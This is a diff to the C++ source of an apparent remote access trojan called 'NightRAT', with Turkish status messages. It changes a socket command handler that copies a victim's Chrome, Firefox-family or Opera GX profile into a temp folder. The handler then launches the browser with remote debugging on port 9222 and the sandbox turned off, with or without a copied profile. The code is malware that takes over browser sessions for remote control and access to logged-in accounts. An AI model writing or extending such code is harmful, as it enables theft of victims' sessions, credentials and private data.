@@ -2019,6 +2019,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring profilePath;
                     wstring profileDir = L"Default";
 
+                    wchar_t tempPath[MAX_PATH];
+                    GetTempPathW(MAX_PATH, tempPath);
+                    wstring tempProfileRoot = tempPath;
+                    tempProfileRoot += L"NightRAT_";
+                    if (wRequestedPath == L"Opera GX") {
+                        tempProfileRoot += L"operagx";
+                    } else {
+                        tempProfileRoot += exeName;
+                    }
+                    tempProfileRoot += L"_Profile";
+
                     if (copyProfile) {
                         wstring sourceUserData;
                         if (isGecko) {
@@ -2031,17 +2042,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             send_error("User Data directory not found.");
                             return;
                         }
-
-                        wchar_t tempPath[MAX_PATH];
-                        GetTempPathW(MAX_PATH, tempPath);
-                        wstring tempProfileRoot = tempPath;
-                        tempProfileRoot += L"NightRAT_";
-                        if (wRequestedPath == L"Opera GX") {
-                            tempProfileRoot += L"operagx";
-                        } else {
-                            tempProfileRoot += exeName;
-                        }
-                        tempProfileRoot += L"_Profile";
 
                         // Mevcut kopya varsa temizle
                         try {
@@ -2091,6 +2091,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             }
                             profilePath = tempProfileRoot;
                         }
+                    } else {
+                        profilePath = tempProfileRoot;
+                        try {
+                            if (!fs::exists(profilePath)) {
+                                fs::create_directories(profilePath);
+                            }
+                        } catch (...) {}
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
@@ -2098,15 +2105,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote";
-                        if (copyProfile) {
-                            args += L" -profile \"" + profilePath + L"\"";
-                        }
+                        args += L" -profile \"" + profilePath + L"\"";
                     } else {
                         args = L" --remote-debugging-port=9222";
-                        if (copyProfile) {
-                            args += L" --user-data-dir=\"" + profilePath + L"\"";
-                            args += L" --profile-directory=\"" + profileDir + L"\"";
-                        }
+                        args += L" --user-data-dir=\"" + profilePath + L"\"";
+                        args += L" --profile-directory=\"" + profileDir + L"\"";
                         args += L" --no-sandbox"
                                 L" --disable-gpu"
                                 L" --window-size=1280,720"
